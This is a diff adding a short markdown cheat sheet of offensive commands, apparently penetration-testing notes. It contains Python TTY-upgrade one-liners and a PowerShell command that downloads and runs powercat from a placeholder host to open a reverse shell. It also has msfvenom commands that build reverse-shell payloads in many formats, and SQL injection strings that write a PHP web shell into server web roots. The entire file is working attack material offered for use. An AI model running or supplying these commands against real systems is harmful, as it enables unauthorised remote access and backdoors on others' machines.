@@ -1,0 +1,32 @@
+# Interactive TTY Shell
+• python -c 'import pty; pty.spawn("/bin/sh")'
+• python -c 'import pty;pty.spawn("/bin/bash")'
+• python -c 'import pty; pty.spawn("/bin/bash")'
+• /usr/bin/script -qc /bin/bash /dev/null
+------------------------
+# With Powershell 
+• powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://XX.XX.XX.XX/powercat.ps1');powercat -c XX.XX.XX.XX -p 9090 -e cmd"
+------------------------
+# Reverse Shell 
+#Linux
+•msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
+# PHP
+•msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
+# ASP
+•msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=443 -f asp > shell.asp
+# WAR
+•msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
+# JSP
+•msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
+# Exe
+•msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
+# ASPX
+•msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f aspx > shell.aspx
+# ASPX-x64 
+•msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1234 -f aspx > 4.aspx
+------------------------
+#Shell From SQL Injection
+•windows
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+•linux
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
